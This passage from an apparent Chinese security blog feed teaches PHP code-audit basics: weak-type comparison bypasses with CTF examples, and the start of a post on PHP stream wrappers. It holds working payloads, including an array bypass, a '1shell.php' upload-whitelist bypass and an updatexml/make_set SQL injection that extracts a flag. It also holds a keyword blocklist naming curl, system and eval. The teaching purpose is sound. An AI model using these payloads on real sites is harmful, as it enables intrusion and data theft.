<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'password error !'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Please input password !'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里应该是要GET传一个1234567才可以，但是这个函数同样可以通过传一个数组进行绕过</p><p>payload:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>pwd<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token shell-comment comment"># 运行结果</span>success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h4><p>这个函数一共有三个参数，最关键的就是死三个参数，如果没有设置，则默认为进行<strong>松散比较</strong>，这就很危险了呀，这里用一道当年的CTF题来加深一下对这个函数的理解：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Challenge</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token constant">UPLOAD_DIRECTORY</span> <span class="token operator">=</span> <span class="token string">'./solutions/'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$whitelist</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">whitelist</span><span class="token operator">=</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement __destruct() method.</span>            <span class="token comment" spellcheck="true">//这里要特别注意！！！</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">UPLOAD_DIRECTORY</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$challenge</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Challenge</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'solution'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加注释下的哪一行是关键，程序将文件名取出来与白名单进行对比，符合1~24就上传成功，不符合就上传失败，这里就运用到了前面的字符串与数字进行比较，所以payload就出来了：</p><pre class="line-numbers language-php"><code class="language-php">Filename<span class="token punctuation">:</span>1shell<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>CTF实例</strong></p><p>index.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"连接失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  COUNT(*) FROM users"</span><span class="token punctuation">;</span><span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'COUNT(*)'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">stop_hack</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE id=$id"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">,</span><span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"id $id is not in whitelist."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;center>&lt;table border='1'>"</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;tr>&lt;td>&lt;center>$key&lt;/center>&lt;/td>&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;td>&lt;center>$value&lt;/center>&lt;/td>&lt;/tr>&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;/table>&lt;/center>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>config.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"weaktype"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">stop_hack</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span>        "insert<span class="token operator">|</span>delete<span class="token operator">|</span><span class="token keyword">or</span><span class="token operator">|</span>concat<span class="token operator">|</span>concat_ws<span class="token operator">|</span>group_concat<span class="token operator">|</span>join<span class="token operator">|</span>floor<span class="token operator">|</span>        \<span class="token operator">/</span>\<span class="token operator">*</span><span class="token operator">|</span>\<span class="token operator">*</span><span class="token operator">|</span>\<span class="token punctuation">.</span>\<span class="token punctuation">.</span>\<span class="token operator">/</span><span class="token operator">|</span>\<span class="token punctuation">.</span>\<span class="token operator">/</span><span class="token operator">|</span>union<span class="token operator">|</span>into<span class="token operator">|</span>load_file<span class="token operator">|</span>outfile<span class="token operator">|</span>dumpfile<span class="token operator">|</span>sub<span class="token operator">|</span>hex<span class="token operator">|</span>        file_put_contents<span class="token operator">|</span>fwrite<span class="token operator">|</span>curl<span class="token operator">|</span>system<span class="token operator">|</span>eval"<span class="token punctuation">;</span>    <span class="token variable">$back_list</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token variable">$pattern</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$back_list</span> <span class="token keyword">as</span> <span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/$hack/i"</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"$hack detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>db.sql</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">database</span> weaktype<span class="token punctuation">;</span><span class="token keyword">use</span> weaktype<span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">table</span> users <span class="token punctuation">(</span>                       id <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> unsigned <span class="token keyword">auto_increment</span> <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">,</span>                       name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>                       email <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>                       salary <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> unsigned <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>​<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> users <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'Lucia'</span><span class="token punctuation">,</span><span class="token string">'Lucia@hongri.com'</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> users <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'Danny'</span><span class="token punctuation">,</span><span class="token string">'Danny@hongri.com'</span><span class="token punctuation">,</span><span class="token number">4500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> users <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'Alina'</span><span class="token punctuation">,</span><span class="token string">'Alina@hongri.com'</span><span class="token punctuation">,</span><span class="token number">2700</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> users <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'Jameson'</span><span class="token punctuation">,</span><span class="token string">'Jameson@hongri.com'</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> users <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'Allie'</span><span class="token punctuation">,</span><span class="token string">'Allie@hongri.com'</span><span class="token punctuation">,</span><span class="token number">6000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​<span class="token keyword">create</span> <span class="token keyword">table</span> flag<span class="token punctuation">(</span>flag <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> flag <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'HRCTF{1n0rrY_i3_Vu1n3rab13}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先来正常访问一下index吧：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201209174917318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进行<strong>and 1=1 / and 1=2</strong>测试，页面返回不正常，返回去看代码，它的过滤还是比较严格的，但唯独漏下了<strong>updatexml()</strong>和<strong>make_set()</strong>函数，所以我们只能用他俩结合代码中<strong>in_array()未设置第三个参数</strong>，来进行一个绕过注入：</p><p>payload</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">3</span> <span class="token keyword">and</span> <span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">make_set</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>select flag from flag limit <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020120918020836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>相关链接</strong></p><ul><li><a href="https://www.cnblogs.com/-zhong/p/10927731.html" target="_blank" rel="noopener">updatexml()用法</a></li><li><a href="https://blog.csdn.net/qq_41725312/article/details/83039525" target="_blank" rel="noopener">make_set()用法</a></li></ul><h4 id="array-search"><a href="#array-search" class="headerlink" title="array_search()"></a>array_search()</h4><p>这是它的用法<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201209184127757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>CTF实例</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$test</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"error"</span><span class="token punctuation">;</span>                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"false"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Please input array test'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入test[]=0，那么test就是一个数值型的数组，即 Array ( [0] =&gt; 0 ) ，array_search()  在test数值型数组中查找 “admin” 这个字符串的时候，首先会把字符串转换为数字，转换规则具体看本文第二个示例，所以 “admin” 变成了0，array_search()如果查找成功就会返回其键名，test数组中0的键名是0，而0===0，所以输出flag。</p><p>payload</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>test<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="swich"><a href="#swich" class="headerlink" title="swich"></a>swich</h4><p>先来看一段代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token variable">$a</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">echo</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token variable">$a</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">echo</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token keyword">echo</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>乍一看，好像是输出0，但其实它是输出1的。。。</p><p>PHP中的swich是有点坑的，它匹配的是case中表达式的整数值，而第一个表达式<strong>$a &gt;= 0</strong>，结果为Ture，case自动将它转换为int类型，也就是1，所以就匹配不上了，而第二个case的结果是false，int类型也就是0，正好匹配上了，所以会输出1。</p><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201209191046244.png" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 弱类型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：PHP伪协议</title>
      <link href="/posts/26442c74.html"/>
      <url>/posts/26442c74.html</url>
      
        <content type="html"><![CDATA[<h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h3><p>条件：</p><ul><li>allow_url_fopen = on/off</li><li>allow_url_include = on/off</li></ul><p>作用：</p><blockquote><p>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p></blockquote><p>说明：</p><blockquote><p><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()，include_path</code> 会可选地搜索，也作为相对的路径。</p></blockquote><p>例子：</p><ol><li><code>file://文件的绝对路径/文件名</code></li></ol><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//1.1.1.137:8001/protocol/file.php?file=C:\phpstudy\WWW\A_testCode\protocol\1.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201209214228931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h3><p>条件：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code>:仅<code>php://input php://stdin php://memory php://temp</code> 需要on</li></ul><p>作用：</p><ul><li><code>php://</code> 访问各个输入/输出流（I/O streams），在<code>CTF</code>中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</li></ul><p>说明：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype="multipart/form-data"</code> 的时候<code>php://input</code> 是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/test</code> 引用了文件描述符 test。</td></tr><tr><td>php://memory   php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在<code>内存</code>中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入<code>临时文件</code>中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 